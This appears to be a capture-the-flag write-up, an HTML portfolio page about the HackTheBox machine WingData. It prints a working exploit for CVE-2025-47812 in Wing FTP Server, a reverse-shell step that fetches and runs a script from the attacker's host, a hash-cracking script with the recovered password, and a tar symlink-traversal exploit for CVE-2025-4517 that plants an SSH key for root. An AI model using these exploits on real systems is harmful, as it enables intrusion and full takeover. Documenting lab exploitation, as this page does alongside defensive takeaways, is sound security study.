@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WingData Writeup | Koussay Aydi</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <canvas id="particles-canvas"></canvas>
+    <div class="scroll-progress" id="scrollProgress"></div>
+    <header class="topbar">
+        <div class="brand">
+            <div class="brand-mark">KA</div>
+            <div class="brand-info">
+                <p class="brand-label">Koussay Aydi</p>
+                <span class="brand-subtitle">Red Team Writeup</span>
+            </div>
+        </div>
+        <nav class="main-nav">
+            <a href="../index.html">Back to Portfolio</a>
+        </nav>
+        <div class="topbar-actions">
+            <button id="mobileMenuBtn" class="icon-btn mobile-menu-btn" aria-label="Open mobile menu"><i class="fas fa-bars"></i></button>
+        </div>
+    </header>
+    <div class="mobile-nav" id="mobileNav" aria-hidden="true">
+            <a href="../index.html">Back to Portfolio</a>
+    </div>
+    <main class="page-shell">
+        <article class="panel writeup-content">
+            <span class="eyebrow">HackTheBox — WingData (Linux Easy)</span>
+            <h1>WingData Writeup</h1>
+            <p><strong>Author:</strong> atrox | <strong>Tags:</strong> Wing FTP, CVE-2025-47812, Lua RCE, MD5, SHA256, CVE-2025-4517, PATH_MAX, Symlink Traversal</p>
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>Summary</h2>
+            <p>WingData hosts a Wing FTP Server (v7.4.3) exposed via a virtual host. Anonymous login is enabled, which allows exploitation of <strong>CVE-2025-47812</strong> — a pre-authentication RCE via null byte injection in the session Lua file. After gaining a foothold as <code>wingftp</code>, credentials for the user <code>wacky</code> are recovered from Wing FTP's configuration (MD5 admin hash) and its user database (salted SHA256 hashes). Privilege escalation to <code>root</code> is achieved by abusing a vulnerable Python backup script via a crafted tarball that exploits symlink traversal (<strong>CVE-2025-4517</strong> / <code>PATH_MAX</code> overflow in <code>os.path.realpath()</code>).</p>
+
+            <h2>Reconnaissance</h2>
+            <h3>Port Scan</h3>
+            <pre><code class="language-bash">nmap -sV --open 10.129.1.250</code></pre>
+            <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.66</code></pre>
+            <p>Two services exposed: SSH (22) and HTTP (80).</p>
+
+            <h2>Enumeration</h2>
+            <h3>Virtual Host Discovery</h3>
+            <p>ffuf vhost enumeration reveals a hidden virtual host:</p>
+            <pre><code class="language-bash">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -u http://wingdata.htb -H "Host: FUZZ.wingdata.htb" \
+  -fc 301,302,400</code></pre>
+            <p>Result: <code>ftp.wingdata.htb</code> — add to <code>/etc/hosts</code> before proceeding.</p>
+
+            <h3>Web Service Fingerprinting</h3>
+            <table>
+                <thead>
+                    <tr><th>Category</th><th>Finding</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><strong>Virtual Host</strong></td><td><code>ftp.wingdata.htb</code></td></tr>
+                    <tr><td><strong>Service</strong></td><td>Wing FTP Server (Free Edition) — HTTP web client</td></tr>
+                    <tr><td><strong>HTTP Header</strong></td><td><code>Server: Wing FTP Server(Free Edition)</code></td></tr>
+                    <tr><td><strong>Web Interface</strong></td><td>Redirects to <code>login.html</code></td></tr>
+                    <tr><td><strong>Key Pages</strong></td><td><code>main.html</code>, <code>editor.html</code> (Lua RCE vector), <code>login.html</code></td></tr>
+                    <tr><td><strong>Directory Scan</strong></td><td><code>bookmark.html</code>, <code>copy.html</code>, <code>dir.html</code>, <code>search.html</code>, <code>uploader.html</code></td></tr>
+                </tbody>
+            </table>
+
+            <h3>Version Confirmation</h3>
+            <pre><code class="language-bash">curl -i -X POST http://ftp.wingdata.htb/login.html -d "username=anonymous&password="</code></pre>
+            <p>The page footer reveals:</p>
+            <pre><code>FTP server software powered by Wing FTP Server v7.4.3</code></pre>
+            <p><strong>Wing FTP Server v7.4.3 is vulnerable to CVE-2025-47812.</strong></p>
+
+            <h2>Foothold — CVE-2025-47812 (Pre-Auth RCE via Null Byte Injection)</h2>
+            <h3>Vulnerability Overview</h3>
+            <p>Wing FTP Server v7.4.3 persists session data as <strong>Lua scripts</strong> on disk, executed later via <code>dofile("session_file")</code>. A typical session file:</p>
+            <pre><code class="language-lua">Session = {
+  username = "user",
+  ip = "1.2.3.4",
+  homedir = "/home/user",
+}</code></pre>
+            <p>The flaw arises from a mismatch between C/C++ string handling (null-terminated) and Lua string processing (length-aware):</p>
+            <ul>
+                <li><strong>Validation layer:</strong> <code>strlen</code> sees <code>"admin\0evil"</code> as <code>"admin"</code> — null byte terminates the check.</li>
+                <li><strong>File writer:</strong> Persists the raw buffer, including everything after <code>\0</code>.</li>
+                <li><strong>Lua interpreter:</strong> <code>dofile()</code> executes everything after the null byte as Lua code.</li>
+            </ul>
+            <p>This enables pre-authentication RCE by injecting arbitrary Lua code into the username field.</p>
+
+            <h3>Anonymous Login & Session Cookie</h3>
+            <pre><code class="language-bash">curl -i -X POST http://ftp.wingdata.htb/loginok.html -d "username=anonymous&password="</code></pre>
+            <pre><code>Set-Cookie: UID=650401a0dfc273e71179dfaad80f8173f528764d624db129b32c21fbca0cb8d6; HttpOnly</code></pre>
+
+            <h3>Exploit Script — <code>wingexploit.py</code></h3>
+            <pre><code class="language-python">#!/usr/bin/env python3
+# CVE-2025-47812 - Wing FTP Server pre-auth RCE via null byte injection
+# Usage: python3 wingexploit.py -u http://ftp.wingdata.htb -c "id" -v
+
+import argparse
+import requests
+
+def exploit(base_url, command, verbose=False):
+    login_url  = f"{base_url}/loginok.html"
+    trigger_url = f"{base_url}/dir.html"
+
+    # Null byte payload: inject Lua os.execute() after the null byte
+    # anonymous\x00"]]..os.execute('COMMAND')..[["
+    payload = 'anonymous\x00"]]..os.execute(\'' + command + '\')..[["'
+
+    if verbose:
+        print(f"[*] Testing target: {base_url}")
+        print(f"[+] Sending POST request to {login_url} with command: '{command}' and username: 'anonymous'")
+
+    # Step 1 – authenticate anonymously with poisoned username
+    r = requests.post(login_url, data={"username": payload, "password": ""}, allow_redirects=False)
+    uid = r.cookies.get("UID")
+
+    if not uid:
+        print("[-] Failed to get UID cookie")
+        return
+
+    if verbose:
+        print(f"[+] UID extracted: {uid}")
+        print(f"[+] Sending GET request to {trigger_url} with UID: {uid}")
+
+    # Step 2 – trigger session file execution
+    cookies = {"UID": uid}
+    try:
+        r2 = requests.get(trigger_url, cookies=cookies, timeout=10)
+        print("\n--- Command Output ---")
+        # Output is embedded in the response body
+        for line in r2.text.splitlines():
+            line = line.strip()
+            if line and not line.startswith("&lt;") and not line.startswith("//"):
+                print(line)
+        print("----------------------\n")
+    except Exception as e:
+        print(f"[-] Error sending GET request to {trigger_url}: {e}")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="CVE-2025-47812 Wing FTP RCE")
+    parser.add_argument("-u", "--url",     required=True, help="Base URL (e.g. http://ftp.wingdata.htb)")
+    parser.add_argument("-c", "--command", required=True, help="Command to execute")
+    parser.add_argument("-v", "--verbose", action="store_true")
+    args = parser.parse_args()
+    exploit(args.url, args.command, args.verbose)</code></pre>
+
+            <h3>Exploitation Steps</h3>
+            <p><strong>Step 1 — Verify RCE:</strong></p>
+            <pre><code class="language-bash">python3 wingexploit.py -u http://ftp.wingdata.htb -c "id" -v</code></pre>
+            <pre><code>[+] UID extracted: ced03721704acca43b0a83cc789e7cdff528764d624db129b32c21fbca0cb8d6
+--- Command Output ---
+uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),...
+</code></pre>
+            <p><strong>Step 2 — Reverse shell:</strong></p>
+            <pre><code class="language-bash"># Terminal 1 – prepare payload
+echo 'bash -i &gt;& /dev/tcp/10.10.14.18/4444 0&gt;&1' &gt; rev.sh
+python3 -m http.server 8000
+
+# Terminal 2 – listener
+nc -lvnp 4444
+
+# Terminal 3 – deliver
+python3 wingexploit.py -u http://ftp.wingdata.htb \
+  -c "curl http://10.10.14.18:8000/rev.sh | bash" -v</code></pre>
+            <p>Shell received:</p>
+            <pre><code>connect to [10.10.14.18] from (UNKNOWN) [10.129.6.157] 54490
+wingftp@wingdata:/opt/wftpserver$
+</code></pre>
+
+            <h2>Post-Exploitation — Internal Enumeration</h2>
+            <h3>Wing FTP Data Directory</h3>
+            <pre><code class="language-bash">ls -la /opt/wftpserver/Data/
+cat /opt/wftpserver/Data/settings.xml</code></pre>
+
+            <h3>Admin Password Hash (MD5)</h3>
+            <p><code>settings.xml</code> exposes the server admin password hash:</p>
+            <pre><code class="language-xml">&lt;ServerPassword&gt;2D35A8D420A697203D7C554A678F8119&lt;/ServerPassword&gt;</code></pre>
+
+            <h3>User Database — Salted SHA256 Hashes</h3>
+            <p>Wing FTP stores user passwords as <code>SHA256(password + "WingFTP")</code>. Hashes discovered during enumeration of the Wing FTP user database:</p>
+            <table>
+                <thead>
+                    <tr><th>User</th><th>SHA256 Hash</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>anonymous</td><td><code>d67f86152e5c4df1b0ac4a18d3ca4a89...</code></td></tr>
+                    <tr><td>john</td><td><code>c1f14672feec3bba27231048271fcdcd...</code></td></tr>
+                    <tr><td>maria</td><td><code>a70221f33a51dca76dfd46c17ab17116...</code></td></tr></td></tr>
+                    <tr><td>steve</td><td><code>5916c7481fa2f20bd86f4bdb900f0342...</code></td></tr>
+                    <tr><td><strong>wacky</strong></td><td><code>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</code></td></tr>
+                </tbody>
+            </table>
+
+            <h3>Hash Cracking Script — <code>crack.py</code></h3>
+            <pre><code class="language-python">#!/usr/bin/env python3
+# Crack Wing FTP salted SHA256 hashes
+# Hash format: SHA256(password + "WingFTP")
+
+import hashlib
+
+SALT   = "WingFTP"
+TARGET = "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca"
+WORDLIST = "/usr/share/wordlists/rockyou.txt"
+
+with open(WORDLIST, "r", errors="ignore") as f:
+    for line in f:
+        pwd = line.strip()
+        candidate = hashlib.sha256((pwd + SALT).encode()).hexdigest()
+        if candidate == TARGET:
+            print(f"[+] FOUND: {pwd}")
+            break
+    else:
+        print("[-] Password not found in wordlist")</code></pre>
+            <pre><code class="language-bash">python3 crack.py
+[+] FOUND: !#7Blushing^*Bride5</code></pre>
+
+            <h2>User Flag</h2>
+            <pre><code class="language-bash">ssh wacky@10.129.8.28
+# Password: !#7Blushing^*Bride5
+
+cat /home/wacky/user.txt
+</code></pre>
+
+            <h2>Privilege Escalation — CVE-2025-4517 (Tarfile Path Traversal via <code>PATH_MAX</code> Overflow)</h2>
+            <h3>Vulnerability Overview</h3>
+            <p>A sudo rule allows <code>wacky</code> to run <code>/opt/backup_clients/restore_backup_clients.py</code> as <code>root</code>. This script extracts user-supplied tar archives into a staging directory and uses <code>os.path.realpath()</code> to verify that extracted paths remain within the staging area.</p>
+            <p><strong>The flaw:</strong> If a symlink chain inside the tarball causes the resolved path to exceed <code>PATH_MAX</code> (~4096 bytes), <code>os.path.realpath()</code> returns a <strong>truncated result without raising an error</strong>. The sanitization check sees a safe-looking truncated path, but the actual filesystem extraction follows the full symlink chain — pointing outside the staging directory to arbitrary locations on disk.</p>
+
+            <h3>Exploit Script — <code>root.sh</code></h3>
+            <pre><code class="language-bash">#!/bin/bash
+# CVE-2025-4517 - restore_backup_clients.py PATH_MAX tarfile traversal
+# Injects our SSH public key into /root/.ssh/authorized_keys
+
+# 0. Clean up any interfering Python modules
+echo "[+] Cleaning up interfering files..."
+rm -f /tmp/tarfile.py /tmp/sys.py /tmp/os.py /tmp/*.pyc
+rm -rf /tmp/__pycache__
+pkill -9 rootbash 2&gt;/dev/null
+rm -f /tmp/rootbash
+
+# 1. Generate a temporary SSH keypair
+echo "[+] Creating SSH key for root access..."
+rm -f /tmp/rootkey /tmp/rootkey.pub
+ssh-keygen -t ed25519 -f /tmp/rootkey -N "" -q
+PUBKEY=$(cat /tmp/rootkey.pub)
+
+# 2. Build the malicious tar archive
+echo "[+] Building malicious tar archive..."
+cd ~
+python3 - &lt;&lt; EOF
+import tarfile, os, io
+
+pubkey = b"$PUBKEY\n"
+
+# Deep path: 16 components of 247 chars each  → total &gt; PATH_MAX (4096)
+comp  = "d" * 247
+steps = "abcdefghijklmnop"   # 16 characters = 16 directory levels
+path  = ""
+
+with tarfile.open("/tmp/backup_2000.tar", "w") as tar:
+    # Build deeply-nested real directories interleaved with symlinks
+    for s in steps:
+        d = tarfile.TarInfo(os.path.join(path, comp))
+        d.type = tarfile.DIRTYPE
+        tar.addfile(d)
+
+        l = tarfile.TarInfo(os.path.join(path, s))
+        l.type   = tarfile.SYMTYPE
+        l.linkname = comp
+        tar.addfile(l)
+        path = os.path.join(path, comp)
+
+    # Final deep symlink: points far enough up to escape the staging dir
+    linkpath = os.path.join("/".join(steps), "l" * 254)
+    final          = tarfile.TarInfo(linkpath)
+    final.type     = tarfile.SYMTYPE
+    final.linkname = "../" * len(steps)   # walk up past the staging root
+    tar.addfile(final)
+
+    # Escape symlink → resolves to /root through the traversal chain
+    escape          = tarfile.TarInfo("escape")
+    escape.type     = tarfile.SYMTYPE
+    escape.linkname = linkpath + "/../../../../../../root"
+    tar.addfile(escape)
+
+    # Create .ssh directory through the escape symlink
+    ssh_dir      = tarfile.TarInfo("escape/.ssh")
+    ssh_dir.type = tarfile.DIRTYPE
+    ssh_dir.mode = 0o700
+    tar.addfile(ssh_dir)
+
+    # Overwrite authorized_keys with our public key
+    auth      = tarfile.TarInfo("escape/.ssh/authorized_keys")
+    auth.size = len(pubkey)
+    auth.mode = 0o600
+    tar.addfile(auth, io.BytesIO(pubkey))
+
+print("[+] Malicious tar created successfully")
+EOF
+
+# 3. Drop the payload in the watched backups directory
+echo "[+] Copying to backups directory..."
+cp /tmp/backup_2000.tar /opt/backup_clients/backups/
+
+# 4. Trigger the vulnerable restore script as root
+echo "[+] Triggering extraction as root..."
+sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
+  -b backup_2000.tar -r restore_final
+
+echo "[+] Waiting for extraction to complete..."
+sleep 2
+
+# 5. SSH in as root using the injected key
+echo "[+] Connecting as root..."
+ssh -i /tmp/rootkey -o StrictHostKeyChecking=no root@localhost \
+  "id; echo 'Root shell obtained'; cat /root/root.txt"</code></pre>
+
+            <h3>Execution</h3>
+            <pre><code class="language-bash">chmod +x root.sh
+./root.sh</code></pre>
+            <pre><code>[+] Cleaning up interfering files...
+[+] Creating SSH key for root access...
+[+] Building malicious tar archive...
+[+] Malicious tar created successfully
+[+] Copying to backups directory...
+[+] Triggering extraction as root...
+[+] Backup: backup_2000.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_final
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_final
+[+] Waiting for extraction to complete...
+[+] Connecting as root...
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+            <h2>Root Flag</h2>
+            <pre><code class="language-bash">cat /root/root.txt</code></pre>
+
+            <h2>Attack Chain Summary</h2>
+            <pre><code>Nmap
+└─&gt; Port 80 (Apache) + Port 22 (SSH)
+    └─&gt; ffuf vhost → ftp.wingdata.htb
+        └─&gt; Wing FTP Server v7.4.3 identified
+            └─&gt; Anonymous login enabled
+                └─&gt; CVE-2025-47812: null byte → Lua session poisoning → RCE
+                    └─&gt; Reverse shell as wingftp
+                        └─&gt; settings.xml → admin MD5 hash
+                        └─&gt; User DB → salted SHA256 hashes
+                            └─&gt; crack.py → wacky:!#7Blushing^*Bride5
+                                └─&gt; SSH → user.txt
+                                    └─&gt; sudo restore_backup_clients.py
+                                        └─&gt; CVE-2025-4517: PATH_MAX tarball traversal
+                                            └─&gt; SSH key injected into /root/.ssh
+                                                └─&gt; root shell → root.txt</code></pre>
+
+            <h2>Scripts Used</h2>
+            <div class="hero-meta" style="background: none; border: none; padding: 0;">
+                <code>wingexploit.py</code> <code>crack.py</code> <code>root.sh</code>
+            </div>
+
+            <h2>Key Takeaways</h2>
+            <ul>
+                <li><strong>Null byte injection</strong> is a classic but often overlooked attack when C string functions and interpreted languages (Lua, PHP, etc.) are mixed in the same code path.</li>
+                <li><strong>Custom hash schemes</strong> like <code>SHA256(password + "WingFTP")</code> are trivially crackable once the salt is known — proper KDFs (bcrypt, argon2) are essential.</li>
+                <li><strong><code>os.path.realpath()</code> is not a security boundary</strong> when inputs can exceed <code>PATH_MAX</code>. Always validate paths <em>after</em> extraction and use Python's <code>tarfile</code> safe extraction mode (<code>filter='data'</code>, available since Python 3.12).</li>
+            </ul>
+
+            <div style="margin-top: 50px; text-align: center;">
+                <a href="../index.html" class="btn btn-primary"><i class="fas fa-arrow-left"></i> Return Home</a>
+            </div>
+        </article>
+    </main>
+    <script src="../script.js"></script>
+</body>
+</html>
